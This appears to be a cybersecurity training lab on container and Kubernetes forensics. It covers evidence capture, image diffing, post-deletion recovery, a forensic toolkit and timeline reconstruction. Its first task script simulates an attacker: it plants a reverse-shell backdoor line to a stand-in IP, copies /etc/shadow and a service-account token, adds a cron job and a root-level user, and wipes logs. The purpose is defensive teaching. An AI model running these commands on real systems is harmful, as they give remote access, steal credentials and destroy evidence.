# Lab 5.4 — Container Forensics & Evidence Collection
**Phase**: 5 — Expert  
**Difficulty**: ⭐⭐⭐⭐⭐ Expert  
**Estimated Time**: 5–6 hours  
**Category**: Digital Forensics, Incident Investigation, Evidence Preservation

---

## 🎯 Objective

Master **container forensics** — the art of investigating a security incident in a containerized environment. Containers are ephemeral by design, which makes forensics challenging: evidence disappears when a pod restarts. You'll learn to capture, preserve, and analyze forensic evidence from compromised containers and Kubernetes clusters.

---

## 📋 Problem Statement

It's Monday morning. The security team receives an alert from the SOC: unusual outbound traffic was detected from the `checkout-service` pod over the weekend — large data transfers to an external IP at 3 AM.

The on-call engineer, not knowing better, deleted the pod to "fix the issue." A new pod started from the clean image. The attack evidence is gone... or is it?

Your task: Learn the forensic techniques that preserve evidence BEFORE deletion, and the recovery techniques that extract evidence AFTER deletion. Build a forensic toolkit that your team uses during incidents.

---

## 🛠️ Prerequisites

- Docker installed
- Kubernetes cluster (Kind or Minikube)
- `crictl` or container runtime CLI access
- Completed Lab 5.1 (Incident Response Automation)

---

## 📋 Tasks

### Task 1: Create a Forensic Crime Scene

Set up a deliberately compromised container to practice forensics on:

```bash
# Deploy a "compromised" container
kubectl run compromised-app --image=ubuntu:22.04 --restart=Never -- bash -c '
  # Simulate attacker activity
  apt-get update -qq && apt-get install -y -qq curl netcat-openbsd
  
  # Create backdoor
  echo "#!/bin/bash" > /tmp/.hidden-backdoor.sh
  echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> /tmp/.hidden-backdoor.sh
  chmod +x /tmp/.hidden-backdoor.sh
  
  # Exfiltrate sensitive data
  cat /etc/shadow > /tmp/stolen-shadow
  cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/stolen-token
  
  # Download tools
  curl -s -o /tmp/linpeas.sh https://example.com/linpeas.sh 2>/dev/null || true
  
  # Create persistence
  echo "* * * * * /tmp/.hidden-backdoor.sh" > /tmp/evil-cron
  
  # Modify system files
  echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd
  
  # Clean traces (what a real attacker would do)
  history -c
  > /var/log/auth.log
  
  # Keep container running
  sleep 86400
'
```

Wait for the pod to be running, then begin your investigation.

### Task 2: Live Container Forensics

While the container is still running, collect evidence:

1. **Process forensics**: Capture the full process tree, open files, network connections
   ```bash
   # What commands do you use?
   # How do you capture the COMPLETE process state?
   # How do you find hidden processes?
   ```

2. **Filesystem forensics**: Find files the attacker created, modified, or deleted
   ```bash
   # How do you find recently modified files?
   # How do you find hidden files?
   # How do you diff the running container against its original image?
   ```

3. **Network forensics**: Identify suspicious connections
   ```bash
   # How do you capture current network connections?
   # How do you find listening backdoor ports?
   # How do you identify data exfiltration?
   ```

4. **Memory forensics**: Extract information from running process memory
   ```bash
   # How do you examine /proc for running processes?
   # How do you capture environment variables (may contain stolen secrets)?
   # How do you find strings in process memory?
   ```

### Task 3: Container Image Diff

One of the most powerful forensic techniques — compare the running container's filesystem against the original image to find EVERYTHING the attacker changed:

```bash
# Technique 1: docker diff
docker diff <container-id>

# Technique 2: Manual layer comparison
# Export container filesystem
docker export <container-id> > container-fs.tar

# Export original image filesystem
docker save <image-name> > image-layers.tar

# Compare them — find all added/modified/deleted files
```

Create a script `container-diff.sh` that:
1. Takes a container ID and its original image
2. Exports both filesystems
3. Produces a clear diff showing:
   - Added files (attacker tools, backdoors)
   - Modified files (tampered configs, added users)
   - Deleted files (cleaned logs, removed evidence)

### Task 4: Post-Deletion Evidence Recovery

The pod was deleted. What evidence can you still recover?

1. **Container runtime layer**: Even after `kubectl delete pod`, the container layers may persist in the runtime storage for a period
   ```bash
   # On the Kubernetes node:
   # Find the container runtime storage
   crictl ps -a  # Shows recently stopped containers
   
   # Container logs are preserved by the runtime
   crictl logs <container-id>
   
   # Container filesystem may still be accessible
   # Location varies: /var/lib/docker/overlay2/ or /var/lib/containerd/
   ```

2. **Kubernetes audit logs**: What API calls were made?
   ```bash
   # Query K8s audit log for the pod's lifecycle
   # What was deployed? Who deployed it? What was exec'd?
   ```

3. **Node-level evidence**: Host logs, kernel logs, network flow data
   ```bash
   # Journal logs on the node
   journalctl -u kubelet --since "2024-06-14"
   
   # eBPF/Falco logs (if Falco was running — it captures everything)
   kubectl logs -l app.kubernetes.io/name=falco -n falco --since=48h
   ```

4. **Network-level evidence**: DNS queries, flow logs, pcap captures
   ```bash
   # If VPC Flow Logs or Calico flow logs are enabled
   # Identify outbound connections from the pod's IP
   ```

### Task 5: Build a Forensic Toolkit Container

Create a Docker image that contains all forensic tools needed for incident investigation:

```dockerfile
# forensic-toolkit/Dockerfile
FROM ubuntu:22.04

# Install forensic tools
RUN apt-get update && apt-get install -y \
    # Process analysis
    procps htop strace ltrace \
    # Network analysis
    tcpdump nmap netcat-openbsd net-tools iproute2 dnsutils \
    # Filesystem analysis
    findutils file binutils \
    # Text/binary analysis
    strings xxd hexdump grep \
    # Container tools
    skopeo \
    # Scripting
    python3 python3-pip jq \
    # Evidence handling
    sha256sum tar gzip \
    && rm -rf /var/lib/apt/lists/*

# Add custom forensic scripts
COPY scripts/ /forensics/
```

Create these forensic scripts inside the toolkit:
- `full-capture.sh` — comprehensive evidence collection
- `timeline.sh` — build a timeline of attacker activity from timestamps
- `ioc-scanner.sh` — scan for known Indicators of Compromise (suspicious files, processes, network connections)
- `evidence-packager.sh` — create a signed, tamper-evident evidence bundle

### Task 6: Forensic Timeline Analysis

From the evidence you've collected, build a **forensic timeline** — a chronological reconstruction of the attacker's actions:

```markdown
# Timeline Format:
# TIMESTAMP | SOURCE | ACTION | DETAILS

2024-06-14 03:00:01 | k8s-audit | Pod started | checkout-service-7d8f9 created by deploy-bot
2024-06-14 03:00:05 | falco | Shell spawned | /bin/bash spawned in checkout-service
2024-06-14 03:00:07 | container | Package install | apt-get install curl netcat
2024-06-14 03:00:15 | container | File created | /tmp/.hidden-backdoor.sh
2024-06-14 03:00:18 | container | Sensitive read | /etc/shadow accessed
2024-06-14 03:00:20 | container | Token theft | SA token read
2024-06-14 03:00:25 | container | Persistence | Cron job created
2024-06-14 03:00:30 | container | Priv escalation | User 'attacker' added to /etc/passwd (UID 0)
2024-06-14 03:01:00 | network | Exfiltration | Outbound connection to 203.0.113.50:443
2024-06-14 03:01:15 | container | Anti-forensics | history cleared, auth.log wiped
```

---

## 📝 Deliverables

1. `forensic-toolkit/` — Docker image with forensic tools and scripts
2. `container-diff.sh` — container vs image filesystem comparison
3. `timeline.md` — reconstructed attacker timeline
4. `forensic-report.md` — complete forensic investigation report
5. `evidence-bundle/` — collected evidence with integrity hashes
6. `recommendations.md` — post-incident security improvements

---

## ❓ Questions to Answer

1. A developer deletes a compromised pod "to fix the incident." What evidence is now permanently lost? What evidence is still recoverable?
2. Why is **chain of custody** important in forensics? How do SHA-256 hashes help maintain it?
3. What is the difference between **volatile evidence** (disappears when container stops) and **persistent evidence** (survives container deletion)?
4. An attacker clears their bash history and wipes logs. What forensic techniques can STILL reveal their actions?
5. Your forensic evidence reveals that an attacker used a Kubernetes service account token to access other services. What is the **blast radius** and how do you determine what they accessed?

---

> 💡 **Forensic golden rule**: "Don't touch the crime scene." In container forensics, this means: don't exec into the compromised container (you'll create artifacts that contaminate evidence). Use forensic tools from OUTSIDE — export the filesystem, capture logs remotely.

> 📋 **Order of volatility**: Collect evidence in this order (most volatile first): 1) Network connections 2) Running processes 3) Memory contents 4) Filesystem state 5) Container logs 6) Kubernetes audit logs 7) Network flow logs

---

## 🔗 Useful Links & References

- [NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response](https://csrc.nist.gov/pubs/sp/800/86/final)
- [RFC 3227: Guidelines for Evidence Collection and Archiving](https://www.rfc-editor.org/rfc/rfc3227)
- [CRI-O / crictl Container Runtime Interface CLI](https://github.com/kubernetes-sigs/cri-tools)
- [Sysdig Inspect: Container Troubleshooting & Forensics UI](https://github.com/draios/sysdig-inspect)
- [Kubernetes Auditing Documentation](https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/)
- [Volatility 3 Memory Forensics Framework](https://github.com/volatilityfoundation/volatility3)
- [SANS Digital Forensics and Incident Response (DFIR)](https://www.sans.org/cyber-security-courses/digital-forensics-incident-response/)


